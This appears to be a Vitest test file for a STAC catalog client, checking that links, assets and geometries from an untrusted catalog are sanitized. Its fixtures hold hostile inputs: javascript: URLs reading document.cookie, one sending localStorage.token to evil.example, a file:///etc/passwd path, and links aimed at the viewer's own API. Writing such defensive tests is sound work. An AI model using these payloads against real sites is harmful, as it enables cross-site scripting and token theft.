// A STAC catalog is a third party whose strings reach fetch, a tile source and
// the raster panel, so these go through the real parsing path rather than
// calling resolveHref on its own.

import { describe, it, expect, beforeEach, vi } from 'vitest';

import {
  catalogUrlRefusal,
  fetchCatalog,
  fetchItemPage,
  itemFootprints,
  parseLinks,
  resolveHref,
} from '../../src/features/stac/client';

const CATALOG = 'https://hostile.example/stac/v1';
const COLLECTIONS = `${CATALOG}/collections`;
const ITEMS = `${COLLECTIONS}/things/items`;

/** the viewer's own origin under jsdom, which is what the session bearer goes to */
const OWN_ORIGIN = window.location.origin;

const fetchMock = vi.fn();

function jsonOk(body: unknown) {
  return { ok: true, status: 200, json: async () => body };
}

beforeEach(() => {
  vi.clearAllMocks();
  globalThis.fetch = fetchMock as never;
});

describe('resolveHref', () => {
  it('drops an href the viewer will not open', () => {
    expect(resolveHref('javascript:alert(1)', CATALOG)).toBeNull();
    expect(resolveHref('data:text/html,<script>alert(1)</script>', CATALOG)).toBeNull();
    expect(resolveHref('file:///etc/passwd', CATALOG)).toBeNull();
    expect(resolveHref('blob:https://hostile.example/abc', CATALOG)).toBeNull();
    expect(resolveHref('', CATALOG)).toBe(CATALOG);
  });

  it('keeps http, https and relative hrefs, with tile braces intact', () => {
    expect(resolveHref('/other/catalog', CATALOG)).toBe('https://hostile.example/other/catalog');
    expect(resolveHref('http://plain.example/a', CATALOG)).toBe('http://plain.example/a');
    expect(resolveHref('/tiles/{z}/{x}/{y}.png', CATALOG)).toBe(
      'https://hostile.example/tiles/{z}/{x}/{y}.png',
    );
  });

  it('refuses a catalog elsewhere that names our own origin', () => {
    expect(resolveHref(`${OWN_ORIGIN}/api/v1/projects`, CATALOG)).toBeNull();
    expect(resolveHref(`${OWN_ORIGIN}/api/v1/projects`, `${OWN_ORIGIN}/stac/v1`)).toBe(
      `${OWN_ORIGIN}/api/v1/projects`,
    );
  });
});

describe('parseLinks', () => {
  it('drops the links the viewer will not open and keeps the rest', () => {
    const links = parseLinks(
      {
        links: [
          { rel: 'self', href: CATALOG },
          { rel: 'run', href: 'javascript:fetch("//evil.example?t="+localStorage.token)' },
          { rel: 'seed', href: 'data:application/json,{"collections":[]}' },
          { rel: 'data', href: './collections' },
          { rel: 'steal', href: `${OWN_ORIGIN}/api/v1/projects`, method: 'POST', body: {} },
        ],
      },
      CATALOG,
    );

    expect(links.map((link) => link.rel)).toEqual(['self', 'data']);
    expect(links[1].href).toBe(`${CATALOG.replace(/\/v1$/, '')}/collections`);
  });
});

describe('a hostile item document', () => {
  const ITEMS_DOC = {
    type: 'FeatureCollection',
    features: [
      {
        id: 'item-1',
        geometry: null,
        properties: { datetime: '2024-06-01T10:20:30Z' },
        assets: {
          script: { href: 'javascript:alert(document.cookie)', type: 'application/geo+json' },
          inline: {
            href: 'data:application/geo+json,{"type":"FeatureCollection","features":[]}',
            type: 'application/geo+json',
          },
          ourApi: { href: `${OWN_ORIGIN}/api/v1/projects`, type: 'application/geo+json' },
          outline: { href: './outline.geojson', type: 'application/geo+json' },
          tiles: { href: `${CATALOG}/tiles/{z}/{x}/{y}.png`, type: 'image/png' },
        },
      },
    ],
    links: [{ rel: 'next', href: 'javascript:void 0' }],
  };

  it('drops every asset href the viewer will not open', async () => {
    fetchMock.mockResolvedValue(jsonOk(ITEMS_DOC));

    const page = await fetchItemPage({ url: ITEMS, searchBody: null });
    const assets = page.items[0].assets;

    expect(assets.map((asset) => asset.key)).toEqual(['outline', 'tiles']);
    expect(assets[0].href).toBe(`${COLLECTIONS}/things/outline.geojson`);
    expect(assets[1].href).toBe(`${CATALOG}/tiles/{z}/{x}/{y}.png`);
  });

  it('drops a next link the viewer will not open, so paging just ends', async () => {
    fetchMock.mockResolvedValue(jsonOk(ITEMS_DOC));

    const page = await fetchItemPage({ url: ITEMS, searchBody: null });

    expect(page.next).toBeNull();
  });
});

describe('a hostile catalog root', () => {
  it('never fetches a collection list the root pointed at our own origin', async () => {
    fetchMock.mockImplementation(async (url: string) => {
      if (url === CATALOG) {
        return jsonOk({
          id: 'hostile',
          title: 'Hostile',
          links: [
            { rel: 'data', href: `${OWN_ORIGIN}/api/v1/projects` },
            { rel: 'search', href: 'javascript:alert(1)' },
          ],
        });
      }
      return jsonOk({ collections: [] });
    });

    const catalog = await fetchCatalog(CATALOG);

    // both bad links fall back to the paths the STAC API spec fixes
    expect(catalog.searchUrl).toBe(`${CATALOG}/search`);
    expect(fetchMock.mock.calls.map((call) => call[0])).toEqual([CATALOG, COLLECTIONS]);
  });
});

describe('catalogUrlRefusal', () => {
  it('takes a full http or https address', () => {
    expect(catalogUrlRefusal(CATALOG)).toBeNull();
    expect(catalogUrlRefusal('http://plain.example/stac')).toBeNull();
  });

  it('refuses anything that would be read against our own origin', () => {
    expect(catalogUrlRefusal('/api/v1/projects')).toBe(
      'Give the whole address, as in https://example.org/stac/v1.',
    );
    expect(catalogUrlRefusal('example.org/stac')).toContain('Give the whole address');
    expect(catalogUrlRefusal('')).toContain('Give the whole address');
  });

  it('names the scheme it will not open', () => {
    expect(catalogUrlRefusal('javascript:alert(1)')).toBe(
      'The viewer opens http and https catalogs, not javascript ones.',
    );
    expect(catalogUrlRefusal('file:///etc/passwd')).toContain('not file ones');
  });
});

describe('a hostile item geometry', () => {
  const GOOD_POLYGON = {
    type: 'Polygon',
    coordinates: [
      [
        [7, 46],
        [8, 46],
        [8, 47],
        [7, 46],
      ],
    ],
  };

  /** one feature per geometry, so the id says which one survived */
  function itemsDoc(geometries: Record<string, unknown>) {
    return {
      type: 'FeatureCollection',
      features: Object.entries(geometries).map(([id, geometry]) => ({
        id,
        geometry,
        properties: {},
        assets: {},
      })),
      links: [],
    };
  }

  async function geometryOf(geometry: unknown) {
    fetchMock.mockResolvedValue(jsonOk(itemsDoc({ subject: geometry })));
    const page = await fetchItemPage({ url: ITEMS, searchBody: null });
    return page.items[0].geometry;
  }

  it('keeps a geometry the map can draw', async () => {
    expect(await geometryOf(GOOD_POLYGON)).toEqual(GOOD_POLYGON);
    expect(await geometryOf({ type: 'Point', coordinates: [7, 46, 1200] })).toEqual({
      type: 'Point',
      coordinates: [7, 46, 1200],
    });
    expect(
      await geometryOf({ type: 'GeometryCollection', geometries: [GOOD_POLYGON] }),
    ).not.toBeNull();
  });

  it('drops a geometry the renderers would read past', async () => {
    expect(await geometryOf(null)).toBeNull();
    expect(await geometryOf('Polygon')).toBeNull();
    expect(await geometryOf([7, 46])).toBeNull();
    expect(await geometryOf({ type: 'Polygon' })).toBeNull();
    expect(await geometryOf({ type: 'Polygon', coordinates: null })).toBeNull();
    expect(await geometryOf({ type: 'Polygon', coordinates: [] })).toBeNull();
    expect(await geometryOf({ type: 'Sphere', coordinates: [7, 46] })).toBeNull();
    expect(await geometryOf({ type: 'Point', coordinates: ['7', '46'] })).toBeNull();
    expect(await geometryOf({ type: 'Point', coordinates: [7, Number.NaN] })).toBeNull();
    expect(await geometryOf({ type: 'GeometryCollection', geometries: [] })).toBeNull();
    expect(
      await geometryOf({ type: 'GeometryCollection', geometries: [{ type: 'Polygon' }] }),
    ).toBeNull();
  });

  it('leaves the bad items out of the footprint layer, keeping the good ones', async () => {
    fetchMock.mockResolvedValue(
      jsonOk(
        itemsDoc({
          drawable: GOOD_POLYGON,
          empty: { type: 'Polygon', coordinates: [] },
          wrongType: { type: 'Sphere', coordinates: [7, 46] },
        }),
      ),
    );

    const page = await fetchItemPage({ url: ITEMS, searchBody: null });
    const footprints = itemFootprints(page.items);

    expect(page.items).toHaveLength(3);
    expect(footprints.features.map((feature) => feature.properties?.id)).toEqual(['drawable']);
  });
});
